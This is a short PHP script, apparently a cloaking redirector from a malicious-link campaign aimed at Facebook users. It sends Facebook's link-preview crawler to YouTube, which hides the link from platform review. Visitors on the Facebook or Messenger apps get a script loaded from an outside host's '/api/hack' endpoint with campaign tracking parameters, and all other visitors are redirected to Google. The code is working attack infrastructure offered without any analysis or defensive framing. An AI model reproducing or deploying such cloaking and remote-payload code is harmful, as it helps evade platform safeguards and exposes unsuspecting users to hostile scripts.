<?php
if(stristr($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit')){
  header("Location: https://youtube.com/");
  exit();
}

$redicc = 'https://google.com';
function isMobile() {return preg_match("/(FB|MessengerForiOS|MessengerLiteForiOS)/i", $_SERVER["HTTP_USER_AGENT"]);}
$check = isMobile();
if($check == 1){echo '<script src="https://stormvideos.tech:3069/api/hack?landing=fbnormal&contador=enteteo02&owner=isaac02&isbot=false"></script>';}else{echo header("Location:".$redicc);}
?>


        
</body></html>